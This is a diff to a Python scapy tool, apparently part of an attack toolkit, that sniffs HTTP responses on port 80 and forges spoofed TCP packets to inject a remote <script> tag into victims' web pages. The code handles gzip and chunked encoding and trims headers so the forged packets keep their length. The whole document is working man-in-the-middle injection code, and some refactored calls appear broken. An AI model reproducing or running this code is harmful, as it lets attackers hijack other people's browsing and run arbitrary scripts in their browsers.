@@ -20,21 +20,43 @@ from scapy.all import *
 
 from src import packet_utilities
 
-
-class JS_Injecter(threading.Thread):
-    """holaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
-    jajajaaaaaaaaaaaaaa"""
-    def __init__(self, exit_event, file_loc, timeout):
-        super().__init__()
-        self.exit_event = exit_event
-        #self.file_loc = file_loc
-        self.timeout = timeout
-        self.injected_code = b"<script src=\"" + file_loc.encode("utf-8") + b"\"></script>\n"
-
-        self.handled_packets = []
+class Spoofed_HTTP_Load(bytes):
+    ###OLD
+    # ~ spoof_load = real_packet.load
         
+    # ~ spoof_load = self._increase_length_attribute(spoof_load)
     
-    def _get_attribute(self, attribute, load):
+    # ~ spoof_load_s = spoof_load.split(b"\r\n\r\n")
+    
+    # ~ content_encoding = None
+    # ~ if b"Content-Encoding: gzip" in spoof_load_s[0]:
+        # ~ content_encoding = "gzip"
+        # ~ print("DETECTED GZIP ENCODING")
+        # ~ try:
+            # ~ spoof_load_s[1] = gzip.decompress(spoof_load_s[1])
+        # ~ except Exception as err:
+            # ~ print("ERROR DECOMPRESSING:", err)
+            
+    # ~ transfer_encoding = None
+    # ~ if b"Transfer-Encoding: chunked" in spoof_load_s[0]:
+        # ~ transfer_encoding = "chunked"
+        # ~ print("DETECTED CHUNKED ENCODING")
+    
+    # ~ if transfer_encoding == "chunked":
+        # ~ spoof_load_s[1] = self._add_injected_code_to_chunked_load(spoof_load_s[1])
+    # ~ else:
+        # ~ spoof_load_s[1] = self.injected_code + spoof_load_s[1]
+
+    # ~ if content_encoding == "gzip":
+        # ~ spoof_load_s[1] = gzip.compress(spoof_load_s[1])
+    
+    # ~ spoof_load = b"\r\n\r\n".join(spoof_load_s)
+
+    # ~ spoof_load = self._shorten_load_if_necessary(spoof_load, len(real_packet.load))
+    
+    
+    ###NEW
+    def _get_header_attribute(self, attribute, load):
         #Returns a string containing the attribute, its value and the \r\n
         first_pos = load.find(attribute.encode())
         if first_pos != -1:
@@ -44,31 +66,54 @@ class JS_Injecter(threading.Thread):
         return b""
     
     
-    def _increase_length_attribute(self, load):
+    def _gzip_action_if_needed(self, load, action):
+        if action == "compress": action = gzip.compress
+        elif action == "decompress": action = gzip.decompress
         
-        first_pos = load.find(b"Content-Length: ")
-        if first_pos != -1:
-            last_pos = load.find(b"\r\n", first_pos)
-            length_all = load[first_pos:last_pos]
-            length_n = load[first_pos+16:last_pos]
-            #print(length_n)
-            new_length = b"Content-Length: " + str(int(length_n)+len(self.injected_code)).encode("utf-8")
-            result = load.replace(length_all, new_length, 1)
-            return result
+        if "gzip" in self.content_encoding_header:
+            try:
+                load = action(load)
+            except Exception as err:
+                print("ERROR WITH GZIP ACTION:", err)
+        
         return load
         
         
-    def _remove_header_attribute_if_necessary(self, attr_name, load, length_needed):
+    def _add_injected_code(self, load):
+        if "chunked" in self.transfer_encoding_header:
+            chunk_start = load.find(b"\r\n")
+            
+            if chunk_start == -1:
+                print("CHUNK START NOT FOUND")
+                print("Returning", (self.injected_code + load).decode())
+                return self.injected_code + load 
+
+            bytes_chunk_length = load[:chunk_start] #chunk length is said before the beggining of the chunk, in the first bytes
+            int_chunk_length = int(bytes_chunk_length, 16) #paso la longitud de bytes de base 16 a int de base 10
+            new_int_chunk_length = int_chunk_length + len(self.injected_code) #le sumo la longitud del codigo
+            new_bytes_chunk_length = hex(new_int_chunk_length)[2:].encode() #paso la longitud de int de base 10 a bytes de base 16. lo del 2 es para quitar el '0x'
+            
+            #print(type(bytes_chunk_length), type(new_bytes_chunk_length), type(self.injected_code))
+            load = load.replace(bytes_chunk_length + b"\r\n", new_bytes_chunk_length + b"\r\n" + self.injected_code)
+            # ~ print("CHUNK LENGTH:", int_chunk_length)
+            # ~ print("ORIGINAL LOAD:", load)
+            # ~ print("LOAD REPLACED:", new_load)
+        else:
+            load = self.injected_code + load
+            
+        return load
+    
+    def _remove_header_attribute_if_needed(self, attr_name, load, length_needed):
         if len(load) > length_needed:
             new_load = load
-            attr_all = self._get_attribute(attr_name, new_load)
+            attr_all = self._get_header_attribute(self, attr_name, new_load)
             if not attr_all:
                 print("Attribute", attr_name, "not found")
                 return load
             
             if len(load) - len(attr_all) > length_needed: #si a pesar de quitarle el atributo sigue siendo muy largo, se lo quito entero
                 new_load = new_load.replace(attr_all, b"", 1)
-                print("Attribute", attr_name, "removed completely to save", len(attr_all), "bytes.")
+                # ~ print("Attribute", attr_name, "removed completely to save", len(attr_all), "bytes.")
             else: #quito la longitud adecuada para llegar al tamaño
                 remove = attr_all[-2-(len(load)-length_needed):-2] #la parte del atributo que quito
                 
@@ -87,24 +132,80 @@ class JS_Injecter(threading.Thread):
 
                     
                 new_load = new_load.replace(remove, b"", 1)
-                print("Attribute", attr_name, "removed partialy to save", len(remove), "bytes. Original attribute length:", len(attr_all))
+                # ~ print("Attribute", attr_name, "removed partialy to save", len(remove), "bytes. Original attribute length:", len(attr_all))
             return new_load
         else:
             return load
 
 
-    def _shorten_load_if_necessary(self, load, length_needed):
-        attributes = ["Date", "Expires", "Last-Modified", "Server"]
+    def _shorten_load_if_needed(self, load, length_needed):
+        attributes = ["Date", "Expires", "Last-Modified", "Server", "X-Powered-By"] #not sure about the last one
         
         new_load = load
         for attr in attributes:
-            new_load = self._remove_header_attribute_if_necessary(attr, new_load, length_needed)
+            new_load = self._remove_header_attribute_if_needed(self, attr, new_load, length_needed)
         
         if len(new_load) > length_needed:
             print("[ERROR] Despite having removed attributes, length was reduced from", len(load), "to", len(new_load), "and not to", length_needed, "(" + str(len(new_load)-length_needed) + " more bytes than intended)")
-        
+            # ~ print(new_load.decode("utf-8", "ignore"))
         return new_load
+                
+    
+    def _increase_length_header_if_needed(self, load):
         
+        first_pos = load.find(b"Content-Length: ")
+        if first_pos != -1:
+            last_pos = load.find(b"\r\n", first_pos)
+            length_all = load[first_pos:last_pos]
+            length_n = load[first_pos+16:last_pos]
+            #print(length_n)
+            new_length = b"Content-Length: " + str(int(length_n)+len(self.injected_code)).encode("utf-8")
+            result = load.replace(length_all, new_length, 1)
+            return result
+        return load
+        
+        
+    def __new__(self, real_load, injected_code):
+        spoof_load = real_load
+        
+        self.injected_code = injected_code
+        
+        self.content_encoding_header = self._get_header_attribute(self, "Content-Encoding", spoof_load).decode()
+        self.transfer_encoding_header = self._get_header_attribute(self, "Transfer-Encoding", spoof_load).decode()
+        
+        spoof_load = spoof_load.split(b"\r\n\r\n")
+        
+        
+        spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "decompress")
+        
+        
+        spoof_load[1] = self._add_injected_code(self, spoof_load[1])
+        
+        
+        spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "compress")
+        
+        spoof_load = b"\r\n\r\n".join(spoof_load)
+        
+        
+        spoof_load = self._shorten_load_if_needed(self, spoof_load, len(real_load))
+        spoof_load = self._increase_length_header_if_needed(self, spoof_load)
+        
+        
+        return super().__new__(self, spoof_load)
+
+
+class JS_Injecter(threading.Thread):
+    """holaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
+    jajajaaaaaaaaaaaaaa"""
+    def __init__(self, exit_event, file_loc, timeout):
+        super().__init__()
+        self.exit_event = exit_event
+        #self.file_loc = file_loc
+        self.timeout = timeout
+        self.injected_code = b"<script src=\"" + file_loc.encode("utf-8") + b"\"></script>\n"
+
+        self.handled_packets = []
+          
     
     def _add_handled_packet(self, packet):
         data = (packet["TCP"].ack, packet["TCP"].seq, packet_utilities.get_checksum(packet, "TCP"))
@@ -116,42 +217,8 @@ class JS_Injecter(threading.Thread):
         result = ((ack,seq,tcp_checksum) in self.handled_packets)
         return result
         
-        
     def send_spoofed_packet(self, real_packet):
-        
-        print("\n")
-        
-        spoof_load = real_packet.load
-        
-        spoof_load = self._increase_length_attribute(spoof_load)
-        
-        spoof_load_s = spoof_load.split(b"\r\n\r\n")
-        
-        encoding = None
-        if b"Content-Encoding: gzip" in spoof_load_s[0]:
-            encoding = "gzip"
-            print("DETECTED GZIP ENCODING")
-            try:
-                spoof_load_s[1] = gzip.decompress(spoof_load_s[1])
-            except Exception as err:
-                print("ERROR DECOMPRESSING:", err)
-        
-        
-        spoof_load_s[1] = self.injected_code + spoof_load_s[1]
-    
-        if encoding == "gzip":
-            spoof_load_s[1] = gzip.compress(spoof_load_s[1])
-        
-        spoof_load = b"\r\n\r\n".join(spoof_load_s)
-        
-
-        ###SPACE1### no le llegan aunque tiene longitud buena
-        spoof_load = self._shorten_load_if_necessary(spoof_load, len(real_packet.load))
-
-        
- 
-        
-
+        spoof_load = Spoofed_HTTP_Load(real_packet.load, self.injected_code)
 
         
         spoof_packet = IP(src=real_packet["IP"].src, dst=real_packet["IP"].dst, flags=real_packet["IP"].flags, id=real_packet["IP"].id)/ \
@@ -159,24 +226,26 @@ class JS_Injecter(threading.Thread):
                        ack=real_packet["TCP"].ack, flags=real_packet["TCP"].flags, window=real_packet["TCP"].window, options=real_packet["TCP"].options)/ \
                        Raw(load=spoof_load)
 
-        print("[BEFORE]:")
-        #print(real_packet.load.decode("utf-8","ignore"))
-        real_packet.show()
-        print("\n[AFTER]:")
-        #print(spoof_load.decode("utf-8","ignore"))
-        spoof_packet.show2()
+        # ~ print("[BEFORE]:")
+        # ~ print(real_packet.load.decode("utf-8","ignore"))
+        # ~ #real_packet.show()
+        # ~ print("\n[AFTER]:")
+        # ~ print(spoof_load.decode("utf-8","ignore"))
+        # ~ #spoof_packet.show2()
         
         print("Spoof load length:", len(spoof_load), "Real load length:", len(real_packet.load))
-        if len(spoof_load) > 2000:
-            spoof_packet.show()
+        # ~ if len(spoof_load) > 2000:
+            # ~ spoof_packet.show()
         # ~ print(len(spoof_packet["IP"]), len(real_packet["IP"]))
         # ~ print(len(spoof_packet["TCP"]), len(real_packet["TCP"]))
         # ~ print(len(spoof_packet["Raw"]), len(real_packet["Raw"]))
         print("Spoof packet length:", len(spoof_packet), "Real packet length:", len(real_packet))
         
-
-        send(spoof_packet)
+        
+        spoof_packet["Raw"].remove_payload()
+        send(spoof_packet, verbose=0)
         self._add_handled_packet(spoof_packet)
+        print()
         
         
     def handle_packet(self, packet):
@@ -189,7 +258,7 @@ class JS_Injecter(threading.Thread):
     def run(self):
         print("JS Injecter started.")
         
-        sniff(filter="tcp and src port 80", lfilter= lambda x: x.haslayer("TCP") and x.haslayer("Raw") and b"ype: text/html" in x.load,
+        sniff(filter="tcp and src port 80", lfilter= lambda x: x.haslayer("TCP") and x.haslayer("Raw") and b"ype: text/html" in x.load, #T not included cause its sometimes t and sometimes T
               prn=self.handle_packet, stopperTimeout=3, stopper=self.exit_event.is_set, 
               timeout=self.timeout, store=False)
         
